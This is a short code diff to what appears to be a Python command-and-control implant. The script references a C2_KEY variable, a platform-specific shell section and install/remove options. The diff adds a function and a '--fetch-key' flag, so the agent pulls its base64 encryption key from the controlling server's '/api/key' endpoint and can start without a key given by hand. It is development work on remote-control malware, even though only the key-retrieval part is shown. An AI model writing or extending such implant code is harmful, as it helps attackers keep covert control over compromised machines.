@@ -91,6 +91,16 @@ def api(url, data=None):
         pass
     return None
 
+def fetch_key():
+    url = SERVER.rstrip("/") + "/api/key"
+    try:
+        r = api(url)
+        if r and "key" in r:
+            return base64.b64decode(r["key"].encode())
+    except Exception:
+        pass
+    return None
+
 # --- Shell (platform-specific) ---
 
 if IS_WIN:
@@ -556,6 +566,13 @@ def main():
         elif a == "--key" and i + 1 < len(sys.argv):
             KEY = base64.b64decode(sys.argv[i + 1].encode())
             i += 2
+        elif a == "--fetch-key":
+            KEY = fetch_key()
+            if not KEY:
+                print("[agent] ERROR: failed to fetch key from server")
+                sys.exit(1)
+            print(f"[agent] key fetched from {SERVER}")
+            i += 1
         elif a == "--install":
             want_install = True; i += 1
         elif a == "--remove":
@@ -576,7 +593,7 @@ def main():
             KEY = base64.b64decode(env_key.encode())
 
     if not KEY:
-        print("[agent] ERROR: no encryption key. Provide --key <base64> or C2_KEY env var")
+        print("[agent] ERROR: no encryption key. Provide --key <base64>, --fetch-key, or C2_KEY env var")
         sys.exit(1)
 
     if want_install:
